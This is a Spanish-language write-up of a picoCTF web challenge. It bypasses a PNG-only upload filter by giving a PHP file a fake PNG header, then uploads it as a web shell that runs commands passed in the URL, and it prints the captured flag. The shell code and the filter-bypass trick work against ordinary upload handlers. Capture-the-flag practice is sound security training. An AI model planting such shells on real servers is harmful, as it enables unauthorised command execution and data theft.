
**Reto:**
-Utilizar un archivo estropeado para acceder a la bandera.

**Descripción:**
-I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:58215/)!

**Solución:**
Utilizar un programa php pretendiendo ser un png para ejecutar comandos en la dirección de la página y obtener el archivo donde se guarda la bandera.
-Crear un archivo llamado 'webshell.png.php' con el siguiente código.
```
PNG
<?php 
if(isset($_GET['cmd'])){
  echo "<pre>";
  system($_GET['cmd']);
  echo "</pre>";
}
?>

```
-Abrir la página.
-Ingresar el archivo a la pagina.
-Cambiar la dirección de la pagina a:
```
http://atlas.picoctf.net:56540/uploads/webshell.png.php?cmd=ls%20..
```
-Esta acción muestra los archivos y directorios de la pagina.
-Entrar a la dirección del primer archivo en la lista.
-Una vez en esta página, la bandera aparecera en la ventana.

El resultado es: **picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}**.

**Notas adicionales:**
-PNG en el inicio del archivo es usado para hacer creer al verificador que un archivo es un png.
-Las instrucciones pueden ser encontradas si se siguen los directorios del archivo 'robots.txt'.

**Referencias:**
http://atlas.picoctf.net:58215/
https://www.php.net/manual/es/features.commandline.options.php